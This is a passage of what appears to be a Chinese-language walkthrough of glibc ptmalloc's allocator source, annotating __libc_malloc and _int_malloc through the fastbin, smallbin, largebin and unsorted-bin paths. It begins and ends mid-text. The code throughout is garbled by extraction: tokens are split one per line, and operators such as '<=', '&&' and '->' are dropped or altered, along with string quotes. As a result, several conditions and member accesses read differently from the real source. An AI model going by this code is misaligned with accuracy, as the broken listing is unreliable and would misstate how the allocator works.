\u624d\u662f\u7533\u8bf7\u5185\u5b58\u5757\u7684\u6838\u5fc3\u3002\u4e0b\u9762\u6211\u4eec\u6765\u4ed4\u7ec6\u5206\u6790\u4e00\u4e0b\u5177\u4f53\u7684\u5b9e\u73b0\u3002\n\n\n__libc_malloc\n\n\n\u8be5\u51fd\u6570\u4f1a\u9996\u5148\u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u51fd\u6570\u7684\u94a9\u5b50\u51fd\u6570\uff08__malloc_hook\uff09\uff0c\u8fd9\u4e2a\u4e3b\u8981\u7528\u4e8e\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u5806\u5206\u914d\u51fd\u6570\uff0c\u65b9\u4fbf\u7528\u6237\u5feb\u901f\u4fee\u6539\u5bf9\u5206\u914d\u51fd\u6570\u5e76\u8fdb\u884c\u6d4b\u8bd5\u3002\u8fd9\u91cc\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\n\u7528\u6237\u7533\u8bf7\u7684\u5b57\u8282\u4e00\u65e6\u8fdb\u5165\u7533\u8bf7\u5185\u5b58\u51fd\u6570\u4e2d\u5c31\u53d8\u6210\u4e86\u65e0\u7b26\u53f7\u6574\u6570\n\u3002\n\n\n// wapper for int_malloc\n\n\nvoid\n \n*\n__libc_malloc\n(\nsize_t\n \nbytes\n)\n \n{\n\n    \nmstate\n \nar_ptr\n;\n\n    \nvoid\n \n*\n \nvictim\n;\n\n    \n// \u68c0\u67e5\u662f\u5426\u6709\u5185\u5b58\u5206\u914d\u94a9\u5b50\uff0c\u5982\u679c\u6709\uff0c\u8c03\u7528\u94a9\u5b50\u5e76\u8fd4\u56de.\n\n    \nvoid\n \n*\n(\n*\nhook\n)(\nsize_t\n,\n \nconst\n \nvoid\n \n*\n)\n \n=\n \natomic_forced_read\n(\n__malloc_hook\n);\n\n    \nif\n \n(\n__builtin_expect\n(\nhook\n \n!=\n \nNULL\n,\n \n0\n))\n\n        \nreturn\n \n(\n*\nhook\n)(\nbytes\n,\n \nRETURN_ADDRESS\n(\n0\n));\n\n\n\n\n\n\u63a5\u7740\u4f1a\u5bfb\u627e\u4e00\u4e2a arena \u6765\u8bd5\u56fe\u5206\u914d\u5185\u5b58\u3002\n\n\n    \narena_get\n(\nar_ptr\n,\n \nbytes\n);\n\n\n\n\n\n\u7136\u540e\u8c03\u7528 _int_malloc \u51fd\u6570\u53bb\u7533\u8bf7\u5bf9\u5e94\u7684\u5185\u5b58\u3002\n\n\n    \nvictim\n \n=\n \n_int_malloc\n(\nar_ptr\n,\n \nbytes\n);\n\n\n\n\n\n\u5982\u679c\u5206\u914d\u5931\u8d25\u7684\u8bdd\uff0cptmalloc \u4f1a\u5c1d\u8bd5\u518d\u53bb\u5bfb\u627e\u4e00\u4e2a\u53ef\u7528\u7684 arena\uff0c\u5e76\u5206\u914d\u5185\u5b58\u3002\n\n\n    \n/* Retry with another arena only if we were able to find a usable arena\n\n\n       before.  */\n\n    \nif\n \n(\n!\nvictim\n \n \nar_ptr\n \n!=\n \nNULL\n)\n \n{\n\n        \nLIBC_PROBE\n(\nmemory_malloc_retry\n,\n \n1\n,\n \nbytes\n);\n\n        \nar_ptr\n \n=\n \narena_get_retry\n(\nar_ptr\n,\n \nbytes\n);\n\n        \nvictim\n \n=\n \n_int_malloc\n(\nar_ptr\n,\n \nbytes\n);\n\n    \n}\n\n\n\n\n\n\u5982\u679c\u7533\u8bf7\u5230\u4e86 arena\uff0c\u90a3\u4e48\u5728\u9000\u51fa\u4e4b\u524d\u8fd8\u5f97\u89e3\u9501\u3002\n\n\n    \nif\n \n(\nar_ptr\n \n!=\n \nNULL\n)\n \n__libc_lock_unlock\n(\nar_ptr\n-\nmutex\n);\n\n\n\n\n\n\u5224\u65ad\u76ee\u524d\u7684\u72b6\u6001\u662f\u5426\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\n\n\n\n\n\u8981\u4e48\u6ca1\u6709\u7533\u8bf7\u5230\u5185\u5b58\n\n\n\u8981\u4e48\u662f mmap \u7684\u5185\u5b58\n\n\n\u8981\u4e48\u7533\u8bf7\u5230\u7684\u5185\u5b58\u5fc5\u987b\u5728\u5176\u6240\u5206\u914d\u7684arena\u4e2d\n\n\n\n\n    \nassert\n(\n!\nvictim\n \n||\n \nchunk_is_mmapped\n(\nmem2chunk\n(\nvictim\n))\n \n||\n\n           \nar_ptr\n \n==\n \narena_for_chunk\n(\nmem2chunk\n(\nvictim\n)));\n\n\n\n\n\n\u6700\u540e\u8fd4\u56de\u5185\u5b58\u3002\n\n\n    \nreturn\n \nvictim\n;\n\n\n}\n\n\n\n\n\n_int_malloc\n\n\n_int_malloc \u662f\u5185\u5b58\u5206\u914d\u7684\u6838\u5fc3\u51fd\u6570\uff0c\u5176\u6838\u5fc3\u601d\u8def\u6709\u5982\u4e0b\n\n\n\n\n\u5b83\u6839\u636e\u7528\u6237\u7533\u8bf7\u7684\n\u5185\u5b58\u5757\u5927\u5c0f\n\u4ee5\u53ca\n\u76f8\u5e94\u5927\u5c0f chunk \u901a\u5e38\u4f7f\u7528\u7684\u9891\u5ea6\n\uff08fastbin chunk, small chunk, large chunk\uff09\uff0c\u4f9d\u6b21\u5b9e\u73b0\u4e86\u4e0d\u540c\u7684\u5206\u914d\u65b9\u6cd5\u3002\n\n\n\u5b83\u7531\u5c0f\u5230\u5927\u4f9d\u6b21\u68c0\u67e5\u4e0d\u540c\u7684 bin \u4e2d\u662f\u5426\u6709\u76f8\u5e94\u7684\u7a7a\u95f2\u5757\u53ef\u4ee5\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42\u7684\u5185\u5b58\u3002\n\n\n\u5f53\u6240\u6709\u7684\u7a7a\u95f2 chunk \u90fd\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5b83\u4f1a\u8003\u8651 top chunk\u3002\n\n\n\u5f53 top chunk \u4e5f\u65e0\u6cd5\u6ee1\u8db3\u65f6\uff0c\u5806\u5206\u914d\u5668\u624d\u4f1a\u8fdb\u884c\u5185\u5b58\u5757\u7533\u8bf7\u3002\n\n\n\n\n\u5728\u8fdb\u5165\u8be5\u51fd\u6570\u540e\uff0c\u51fd\u6570\u7acb\u9a6c\u5b9a\u4e49\u4e86\u4e00\u7cfb\u5217\u81ea\u5df1\u9700\u8981\u7684\u53d8\u91cf\uff0c\u5e76\u5c06\u7528\u6237\u7533\u8bf7\u7684\u5185\u5b58\u5927\u5c0f\u8f6c\u6362\u4e3a\u5185\u90e8\u7684chunk\u5927\u5c0f\u3002\n\n\nstatic\n \nvoid\n \n*\n_int_malloc\n(\nmstate\n \nav\n,\n \nsize_t\n \nbytes\n)\n \n{\n\n    \nINTERNAL_SIZE_T\n \nnb\n;\n  \n/* normalized request size */\n\n    \nunsigned\n \nint\n    \nidx\n;\n \n/* associated bin index */\n\n    \nmbinptr\n         \nbin\n;\n \n/* associated bin */\n\n\n    \nmchunkptr\n       \nvictim\n;\n       \n/* inspected/selected chunk */\n\n    \nINTERNAL_SIZE_T\n \nsize\n;\n         \n/* its size */\n\n    \nint\n             \nvictim_index\n;\n \n/* its bin index */\n\n\n    \nmchunkptr\n     \nremainder\n;\n      \n/* remainder from a split */\n\n    \nunsigned\n \nlong\n \nremainder_size\n;\n \n/* its size */\n\n\n    \nunsigned\n \nint\n \nblock\n;\n \n/* bit map traverser */\n\n    \nunsigned\n \nint\n \nbit\n;\n   \n/* bit map traverser */\n\n    \nunsigned\n \nint\n \nmap\n;\n   \n/* current word of binmap */\n\n\n    \nmchunkptr\n \nfwd\n;\n \n/* misc temp for linking */\n\n    \nmchunkptr\n \nbck\n;\n \n/* misc temp for linking */\n\n\n    \nconst\n \nchar\n \n*\nerrstr\n \n=\n \nNULL\n;\n\n\n    \n/*\n\n\n       Convert request size to internal form by adding SIZE_SZ bytes\n\n\n       overhead plus possibly more to obtain necessary alignment and/or\n\n\n       to obtain a size of at least MINSIZE, the smallest allocatable\n\n\n       size. Also, checked_request2size traps (returning 0) request sizes\n\n\n       that are so large that they wrap around zero when padded and\n\n\n       aligned.\n\n\n     */\n\n\n    \nchecked_request2size\n(\nbytes\n,\n \nnb\n);\n\n\n\n\n\narena\n\n\n    \n/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from\n\n\n       mmap.  */\n\n    \nif\n \n(\n__glibc_unlikely\n(\nav\n \n==\n \nNULL\n))\n \n{\n\n        \nvoid\n \n*\np\n \n=\n \nsysmalloc\n(\nnb\n,\n \nav\n);\n\n        \nif\n \n(\np\n \n!=\n \nNULL\n)\n \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n        \nreturn\n \np\n;\n\n    \n}\n\n\n\n\n\nfast bin\n\n\n\u5982\u679c\u7533\u8bf7\u7684 chunk \u7684\u5927\u5c0f\u4f4d\u4e8e fastbin \u8303\u56f4\u5185\uff0c\n\u9700\u8981\u6ce8\u610f\u7684\u662f\u8fd9\u91cc\u6bd4\u8f83\u7684\u662f\u65e0\u7b26\u53f7\u6574\u6570\n\u3002\n\u6b64\u5916\uff0c\u662f\u4ece fastbin \u7684\u5934\u7ed3\u70b9\u5f00\u59cb\u53d6 chunk\n\u3002\n\n\n    \n/*\n\n\n       If the size qualifies as a fastbin, first check corresponding bin.\n\n\n       This code is safe to execute even if av is not yet initialized, so we\n\n\n       can try it without checking, which saves some time on this fast path.\n\n\n     */\n\n\n    \nif\n \n((\nunsigned\n \nlong\n)\n \n(\nnb\n)\n \n=\n \n(\nunsigned\n \nlong\n)\n \n(\nget_max_fast\n()))\n \n{\n\n        \n// \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u4e0b\u6807\n\n        \nidx\n             \n=\n \nfastbin_index\n(\nnb\n);\n\n        \n// \u5f97\u5230\u5bf9\u5e94\u7684fastbin\u7684\u5934\u6307\u9488\n\n        \nmfastbinptr\n \n*\nfb\n \n=\n \nfastbin\n(\nav\n,\n \nidx\n);\n\n        \nmchunkptr\n    \npp\n \n=\n \n*\nfb\n;\n\n        \n// \u5229\u7528fd\u904d\u5386\u5bf9\u5e94\u7684bin\u5185\u662f\u5426\u6709\u7a7a\u95f2\u7684chunk\u5757\uff0c\n\n        \ndo\n \n{\n\n            \nvictim\n \n=\n \npp\n;\n\n            \nif\n \n(\nvictim\n \n==\n \nNULL\n)\n \nbreak\n;\n\n        \n}\n \nwhile\n \n((\npp\n \n=\n \ncatomic_compare_and_exchange_val_acq\n(\nfb\n,\n \nvictim\n-\nfd\n,\n\n                                                            \nvictim\n))\n \n!=\n \nvictim\n);\n\n        \n// \u5b58\u5728\u53ef\u4ee5\u5229\u7528\u7684chunk\n\n        \nif\n \n(\nvictim\n \n!=\n \n0\n)\n \n{\n\n            \n// \u68c0\u67e5\u53d6\u5230\u7684 chunk \u5927\u5c0f\u662f\u5426\u4e0e\u76f8\u5e94\u7684 fastbin \u7d22\u5f15\u4e00\u81f4\u3002\n\n            \n// \u6839\u636e\u53d6\u5f97\u7684 victim \uff0c\u5229\u7528 chunksize \u8ba1\u7b97\u5176\u5927\u5c0f\u3002\n\n            \n// \u5229\u7528fastbin_index \u8ba1\u7b97 chunk \u7684\u7d22\u5f15\u3002\n\n            \nif\n \n(\n__builtin_expect\n(\nfastbin_index\n(\nchunksize\n(\nvictim\n))\n \n!=\n \nidx\n,\n \n0\n))\n \n{\n\n                \nerrstr\n \n=\n \nmalloc(): memory corruption (fast)\n;\n\n            \nerrout\n:\n\n                \nmalloc_printerr\n(\ncheck_action\n,\n \nerrstr\n,\n \nchunk2mem\n(\nvictim\n),\n \nav\n);\n\n                \nreturn\n \nNULL\n;\n\n            \n}\n\n            \n// \u7ec6\u81f4\u7684\u68c0\u67e5\u3002\u3002\u53ea\u6709\u5728 DEBUG \u7684\u65f6\u5019\u6709\u7528\n\n            \ncheck_remalloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n            \n// \u5c06\u83b7\u53d6\u7684\u5230chunk\u8f6c\u6362\u4e3amem\u6a21\u5f0f\n\n            \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n            \n// \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff\n\n            \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n            \nreturn\n \np\n;\n\n        \n}\n\n    \n}\n\n\n\n\n\nsmall bin\n\n\n\u5982\u679c\u83b7\u53d6\u7684\u5185\u5b58\u5757\u7684\u8303\u56f4\u5904\u4e8e small bin \u7684\u8303\u56f4\uff0c\u90a3\u4e48\u6267\u884c\u5982\u4e0b\u6d41\u7a0b\n\n\n    \n/*\n\n\n       If a small request, check regular bin.  Since these \nsmallbins\n\n\n       hold one size each, no searching within bins is necessary.\n\n\n       (For a large request, we need to wait until unsorted chunks are\n\n\n       processed to find best fit. But for small ones, fits are exact\n\n\n       anyway, so we can check now, which is faster.)\n\n\n     */\n\n\n    \nif\n \n(\nin_smallbin_range\n(\nnb\n))\n \n{\n\n        \n// \u83b7\u53d6 small bin \u7684\u7d22\u5f15\n\n        \nidx\n \n=\n \nsmallbin_index\n(\nnb\n);\n\n        \n// \u83b7\u53d6\u5bf9\u5e94 small bin \u4e2d\u7684 chunk \u6307\u9488\n\n        \nbin\n \n=\n \nbin_at\n(\nav\n,\n \nidx\n);\n\n        \n// \u5148\u6267\u884c victim = last(bin)\uff0c\u83b7\u53d6 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk\n\n        \n// \u5982\u679c victim = bin \uff0c\u90a3\u8bf4\u660e\u8be5 bin \u4e3a\u7a7a\u3002\n\n        \n// \u5982\u679c\u4e0d\u76f8\u7b49\uff0c\u90a3\u4e48\u4f1a\u6709\u4e24\u79cd\u60c5\u51b5\n\n        \nif\n \n((\nvictim\n \n=\n \nlast\n(\nbin\n))\n \n!=\n \nbin\n)\n \n{\n\n            \n// \u7b2c\u4e00\u79cd\u60c5\u51b5\uff0csmall bin \u8fd8\u6ca1\u6709\u521d\u59cb\u5316\u3002\n\n            \nif\n \n(\nvictim\n \n==\n \n0\n)\n \n/* initialization check */\n\n                \n// \u6267\u884c\u521d\u59cb\u5316\uff0c\u5c06 fast bins \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\n\n                \nmalloc_consolidate\n(\nav\n);\n\n            \n// \u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0csmall bin \u4e2d\u5b58\u5728\u7a7a\u95f2\u7684 chunk\n\n            \nelse\n \n{\n\n                \n// \u83b7\u53d6 small bin \u4e2d\u5012\u6570\u7b2c\u4e8c\u4e2a chunk \u3002\n\n                \nbck\n \n=\n \nvictim\n-\nbk\n;\n\n                \n// \u68c0\u67e5 bck-\nfd \u662f\u4e0d\u662f victim\uff0c\u9632\u6b62\u4f2a\u9020\n\n                \nif\n \n(\n__glibc_unlikely\n(\nbck\n-\nfd\n \n!=\n \nvictim\n))\n \n{\n\n                    \nerrstr\n \n=\n \nmalloc(): smallbin double linked list corrupted\n;\n\n                    \ngoto\n \nerrout\n;\n\n                \n}\n\n                \n// \u8bbe\u7f6e victim \u5bf9\u5e94\u7684 inuse \u4f4d\n\n                \nset_inuse_bit_at_offset\n(\nvictim\n,\n \nnb\n);\n\n                \n// \u4fee\u6539 small bin \u94fe\u8868\uff0c\u5c06 small bin \u7684\u6700\u540e\u4e00\u4e2a chunk \u53d6\u51fa\u6765\n\n                \nbin\n-\nbk\n \n=\n \nbck\n;\n\n                \nbck\n-\nfd\n \n=\n \nbin\n;\n\n                \n// \u5982\u679c\u4e0d\u662f main_arena\uff0c\u8bbe\u7f6e\u5bf9\u5e94\u7684\u6807\u5fd7\n\n                \nif\n \n(\nav\n \n!=\n \nmain_arena\n)\n \nset_non_main_arena\n(\nvictim\n);\n\n                \n// \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u6ca1\u6709\u4f5c\u7528\n\n                \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n                \n// \u5c06\u7533\u8bf7\u5230\u7684 chunk \u8f6c\u5316\u4e3a\u5bf9\u5e94\u7684 mem \u72b6\u6001\n\n                \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n                \n// \u5982\u679c\u8bbe\u7f6e\u4e86 perturb_type , \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff\n\n                \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n                \nreturn\n \np\n;\n\n            \n}\n\n        \n}\n\n    \n}\n\n\n\n\n\nlarge bin\n\n\n\u5f53 fast bin\u3001small bin \u4e2d\u7684 chunk \u90fd\u4e0d\u80fd\u6ee1\u8db3\u7528\u6237\u8bf7\u6c42 chunk \u5927\u5c0f\u65f6\uff0c\u5c31\u4f1a\u8003\u8651\u662f\u4e0d\u662f large bin\u3002\u4f46\u662f\uff0c\u5176\u5b9e\u5728 large bin \u4e2d\u5e76\u6ca1\u6709\u76f4\u63a5\u53bb\u626b\u63cf\u5bf9\u5e94 bin \u4e2d\u7684chunk\uff0c\u800c\u662f\u5148\u5229\u7528 malloc_consolidate\uff08\u53c2\u89c1malloc_state\u76f8\u5173\u51fd\u6570\uff09 \u51fd\u6570\u5904\u7406 fast bin \u4e2d\u7684chunk\uff0c\u5c06\u6709\u53ef\u80fd\u80fd\u591f\u5408\u5e76\u7684 chunk \u5148\u8fdb\u884c\u5408\u5e76\u540e\u653e\u5230 unsorted bin \u4e2d\uff0c\u4e0d\u80fd\u591f\u5408\u5e76\u7684\u5c31\u76f4\u63a5\u653e\u5230 unsorted bin \u4e2d\uff0c\u7136\u540e\u518d\u5728\u4e0b\u9762\u7684\u5927\u5faa\u73af\u4e2d\u8fdb\u884c\u76f8\u5e94\u7684\u5904\u7406\u3002\n\u4e3a\u4ec0\u4e48\u4e0d\u76f4\u63a5\u4ece\u76f8\u5e94\u7684 bin \u4e2d\u53d6\u51fa large chunk \u5462\uff1f\u8fd9\u662fptmalloc \u7684\u673a\u5236\uff0c\u5b83\u4f1a\u5728\u5206\u914d large chunk \u4e4b\u524d\u5bf9\u5806\u4e2d\u788e\u7247 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u4ee5\u4fbf\u51cf\u5c11\u5806\u4e2d\u7684\u788e\u7247\u3002\n\n\n    \n/*\n\n\n       If this is a large request, consolidate fastbins before continuing.\n\n\n       While it might look excessive to kill all fastbins before\n\n\n       even seeing if there is space available, this avoids\n\n\n       fragmentation problems normally associated with fastbins.\n\n\n       Also, in practice, programs tend to have runs of either small or\n\n\n       large requests, but less often mixtures, so consolidation is not\n\n\n       invoked all that often in most programs. And the programs that\n\n\n       it is called frequently in otherwise tend to fragment.\n\n\n     */\n\n\n    \nelse\n \n{\n\n        \n// \u83b7\u53d6large bin\u7684\u4e0b\u6807\u3002\n\n        \nidx\n \n=\n \nlargebin_index\n(\nnb\n);\n\n        \n// \u5982\u679c\u5b58\u5728fastbin\u7684\u8bdd\uff0c\u4f1a\u5904\u7406 fastbin \n\n        \nif\n \n(\nhave_fastchunks\n(\nav\n))\n \nmalloc_consolidate\n(\nav\n);\n\n    \n}\n\n\n\n\n\n\u5927\u5faa\u73af\n\n\n\u5982\u679c\u7a0b\u5e8f\u6267\u884c\u5230\u4e86\u8fd9\u91cc\uff0c\u90a3\u4e48\u8bf4\u660e \u4e0e chunk \u5927\u5c0f\u6b63\u597d\u4e00\u81f4\u7684 bin (fast bin\uff0c small bin) \u4e2d\u6ca1\u6709 chunk\u53ef\u4ee5\u76f4\u63a5\u6ee1\u8db3\u9700\u6c42 \uff0c\u4f46\u662flarge chunk  \u5219\u662f\u5728\u8fd9\u4e2a\u5927\u5faa\u73af\u4e2d\u5904\u7406\n\u3002\n\n\n\u5728\u63a5\u4e0b\u6765\u7684\u8fd9\u4e2a\u5faa\u73af\u4e2d\uff0c\u4e3b\u8981\u505a\u4e86\u4ee5\u4e0b\u7684\u64cd\u4f5c\n\n\n\n\n\u5c1d\u8bd5\u4ece unsorted bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58\n\n\n\u5c1d\u8bd5\u4ece large bin \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u7684\u5185\u5b58\n\n\n\u5c1d\u8bd5\u4ece top  chunk \u4e2d\u5206\u914d\u7528\u6237\u6240\u9700\u5185\u5b58\n\n\n\n\n\u8be5\u90e8\u5206\u662f\u4e00\u4e2a\u5927\u5faa\u73af\uff0c\u8fd9\u662f\u4e3a\u4e86\u5c1d\u8bd5\u91cd\u65b0\u5206\u914d small bin chunk\uff0c\u8fd9\u662f\u56e0\u4e3a\u6211\u4eec\u867d\u7136\u4f1a\u9996\u5148\u4f7f\u7528 large bin\uff0ctop chunk \u6765\u5c1d\u8bd5\u6ee1\u8db3\u7528\u6237\u7684\u8bf7\u6c42\uff0c\u4f46\u662f\u5982\u679c\u6ca1\u6709\u6ee1\u8db3\u7684\u8bdd\uff0c\u7531\u4e8e\u6211\u4eec\u5728\u4e0a\u9762\u6ca1\u6709\u5206\u914d\u6210\u529f small bin\uff0c\u6211\u4eec\u5e76\u6ca1\u6709\u5bf9fast bin \u4e2d\u7684 chunk \u8fdb\u884c\u5408\u5e76\uff0c\u6240\u4ee5\u8fd9\u91cc\u4f1a\u8fdb\u884c fast bin chunk \u7684\u5408\u5e76\uff0c\u8fdb\u800c\u4f7f\u7528\u4e00\u4e2a\u5927\u5faa\u73af\u6765\u5c1d\u8bd5\u518d\u6b21\u5206\u914dsmall bin chunk\u3002\n\n\n    \n/*\n\n\n       Process recently freed or remaindered chunks, taking one only if\n\n\n       it is exact fit, or, if this a small request, the chunk is remainder from\n\n\n       the most recent non-exact fit.  Place other traversed chunks in\n\n\n       bins.  Note that this step is the only place in any routine where\n\n\n       chunks are placed in bins.\n\n\n\n       The outer loop here is needed because we might not realize until\n\n\n       near the end of malloc that we should have consolidated, so must\n\n\n       do so and retry. This happens at most once, and only when we would\n\n\n       otherwise need to expand memory to service a \nsmall\n request.\n\n\n     */\n\n\n    \nfor\n \n(;;)\n \n{\n\n        \nint\n \niters\n \n=\n \n0\n;\n\n\n\n\n\nunsort bin \u904d\u5386\n\n\n\u5148\u8003\u8651 unsorted bin\uff0c\u518d\u8003\u8651 last remainder \uff0c\u4f46\u662f\u5bf9\u4e8e small bin chunk \u7684\u8bf7\u6c42\u4f1a\u6709\u6240\u4f8b\u5916\u3002\n\n\n\u6ce8\u610f unsorted bin \u7684\u904d\u5386\u987a\u5e8f\u4e3a bk\u3002\n\n\n        \n// \u5982\u679c unsorted bin \u4e0d\u4e3a\u7a7a\n\n        \n// First In First Out\n\n        \nwhile\n \n((\nvictim\n \n=\n \nunsorted_chunks\n(\nav\n)\n-\nbk\n)\n \n!=\n \nunsorted_chunks\n(\nav\n))\n \n{\n\n            \n// victim \u4e3a unsorted bin \u7684\u6700\u540e\u4e00\u4e2a chunk\n\n            \n// bck \u4e3a unsorted bin \u7684\u5012\u6570\u7b2c\u4e8c\u4e2a chunk\n\n            \nbck\n \n=\n \nvictim\n-\nbk\n;\n\n            \n// \u5224\u65ad\u5f97\u5230\u7684 chunk \u662f\u5426\u6ee1\u8db3\u8981\u6c42\uff0c\u4e0d\u80fd\u8fc7\u5c0f\uff0c\u4e5f\u4e0d\u80fd\u8fc7\u5927\n\n            \n// \u4e00\u822c system_mem \u7684\u5927\u5c0f\u4e3a132K\n\n            \nif\n \n(\n__builtin_expect\n(\nchunksize_nomask\n(\nvictim\n)\n \n=\n \n2\n \n*\n \nSIZE_SZ\n,\n \n0\n)\n \n||\n\n                \n__builtin_expect\n(\nchunksize_nomask\n(\nvictim\n)\n \n \nav\n-\nsystem_mem\n,\n \n0\n))\n\n                \nmalloc_printerr\n(\ncheck_action\n,\n \nmalloc(): memory corruption\n,\n\n                                \nchunk2mem\n(\nvictim\n),\n \nav\n);\n\n            \n// \u5f97\u5230victim\u5bf9\u5e94\u7684chunk\u5927\u5c0f\u3002\n\n            \nsize\n \n=\n \nchunksize\n(\nvictim\n);\n\n\n\n\n\nsmall request\n\n\n\u5982\u679c\u7528\u6237\u7684\u8bf7\u6c42\u4e3a small bin chunk\uff0c\u90a3\u4e48\u6211\u4eec\u9996\u5148\u8003\u8651 last remainder\uff0c\u5982\u679c last remainder \u662f unsorted bin \u4e2d\u7684\u552f\u4e00\u4e00\u5757\u7684\u8bdd\uff0c \u5e76\u4e14 last remainder \u7684\u5927\u5c0f\u5206\u5272\u591f\u8fd8\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a chunk \uff0c\n\u4e3a\u4ec0\u4e48\u6ca1\u6709\u7b49\u53f7\n\uff1f\n\n\n            \n/*\n\n\n               If a small request, try to use last remainder if it is the\n\n\n               only chunk in unsorted bin.  This helps promote locality for\n\n\n               runs of consecutive small requests. This is the only\n\n\n               exception to best-fit, and applies only when there is\n\n\n               no exact fit for a small chunk.\n\n\n             */\n\n\n            \nif\n \n(\nin_smallbin_range\n(\nnb\n)\n \n \nbck\n \n==\n \nunsorted_chunks\n(\nav\n)\n \n\n                \nvictim\n \n==\n \nav\n-\nlast_remainder\n \n\n                \n(\nunsigned\n \nlong\n)\n \n(\nsize\n)\n \n \n(\nunsigned\n \nlong\n)\n \n(\nnb\n \n+\n \nMINSIZE\n))\n \n{\n\n                \n/* split and reattach remainder */\n\n                \n// \u83b7\u53d6\u65b0\u7684 remainder \u7684\u5927\u5c0f\n\n                \nremainder_size\n          \n=\n \nsize\n \n-\n \nnb\n;\n\n                \n// \u83b7\u53d6\u65b0\u7684 remainder \u7684\u4f4d\u7f6e\n\n                \nremainder\n               \n=\n \nchunk_at_offset\n(\nvictim\n,\n \nnb\n);\n\n                \n// \u66f4\u65b0 unsorted bin \u7684\u60c5\u51b5\n\n                \nunsorted_chunks\n(\nav\n)\n-\nbk\n \n=\n \nunsorted_chunks\n(\nav\n)\n-\nfd\n \n=\n \nremainder\n;\n\n                \n// \u66f4\u65b0 av \u4e2d\u8bb0\u5f55\u7684 last_remainder\n\n                \nav\n-\nlast_remainder\n                                \n=\n \nremainder\n;\n\n                \n// \u66f4\u65b0last remainder\u7684\u6307\u9488\n\n                \nremainder\n-\nbk\n \n=\n \nremainder\n-\nfd\n \n=\n \nunsorted_chunks\n(\nav\n);\n\n                \nif\n \n(\n!\nin_smallbin_range\n(\nremainder_size\n))\n \n{\n\n                    \nremainder\n-\nfd_nextsize\n \n=\n \nNULL\n;\n\n                    \nremainder\n-\nbk_nextsize\n \n=\n \nNULL\n;\n\n                \n}\n\n                \n// \u8bbe\u7f6evictim\u7684\u5934\u90e8\uff0c\n\n                \nset_head\n(\nvictim\n,\n \nnb\n \n|\n \nPREV_INUSE\n \n|\n\n                                     \n(\nav\n \n!=\n \nmain_arena\n \n?\n \nNON_MAIN_ARENA\n \n:\n \n0\n));\n\n                \n// \u8bbe\u7f6e remainder \u7684\u5934\u90e8\n\n                \nset_head\n(\nremainder\n,\n \nremainder_size\n \n|\n \nPREV_INUSE\n);\n\n                \n// \u8bbe\u7f6e\u8bb0\u5f55 remainder \u5927\u5c0f\u7684 prev_size \u5b57\u6bb5\uff0c\u56e0\u4e3a\u6b64\u65f6 remainder \u5904\u4e8e\u7a7a\u95f2\u72b6\u6001\u3002\n\n                \nset_foot\n(\nremainder\n,\n \nremainder_size\n);\n\n                \n// \u7ec6\u81f4\u7684\u68c0\u67e5\uff0c\u975e\u8c03\u8bd5\u72b6\u6001\u4e0b\u6ca1\u6709\u4f5c\u7528\n\n                \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n                \n// \u5c06 victim \u4ece chunk \u6a21\u5f0f\u8f6c\u5316\u4e3amem\u6a21\u5f0f\n\n                \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n                \n// \u5982\u679c\u8bbe\u7f6e\u4e86perturb_type, \u5219\u5c06\u83b7\u53d6\u5230\u7684chunk\u521d\u59cb\u5316\u4e3a perturb_type ^ 0xff\n\n                \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n                \nreturn\n \np\n;\n\n            \n}\n\n\n\n\n\n\u521d\u59cb\u53d6\u51fa\n\n\n            \n/* remove from unsorted list */\n\n            \nunsorted_chunks\n(\nav\n)\n-\nbk\n \n=\n \nbck\n;\n\n            \nbck\n-\nfd\n                 \n=\n \nunsorted_chunks\n(\nav\n);\n\n\n\n\n\nexact fit\n\n\n\u5982\u679c\u4ece unsorted bin \u4e2d\u53d6\u51fa\u6765\u7684 chunk \u5927\u5c0f\u6b63\u597d\u5408\u9002\uff0c\u5c31\u76f4\u63a5\u4f7f\u7528\u3002\u8fd9\u91cc\u5e94\u8be5\u5df2\u7ecf\u628a\u5408\u5e76\u540e\u6070\u597d\u5408\u9002\u7684 chunk \u7ed9\u5206\u914d\u51fa\u53bb\u4e86\u3002\n\n\n            \n/* Take now instead of binning if exact fit */\n\n            \nif\n \n(\nsize\n \n==\n \nnb\n)\n \n{\n\n                \nset_inuse_bit_at_offset\n(\nvictim\n,\n \nsize\n);\n\n                \nif\n \n(\nav\n \n!=\n \nmain_arena\n)\n \nset_non_main_arena\n(\nvictim\n);\n\n                \ncheck_malloced_chunk\n(\nav\n,\n \nvictim\n,\n \nnb\n);\n\n                \nvoid\n \n*\np\n \n=\n \nchunk2mem\n(\nvictim\n);\n\n                \nalloc_perturb\n(\np\n,\n \nbytes\n);\n\n                \nreturn\n \np\n;\n\n            \n}\n\n\n\n\n\nplace chunk in small 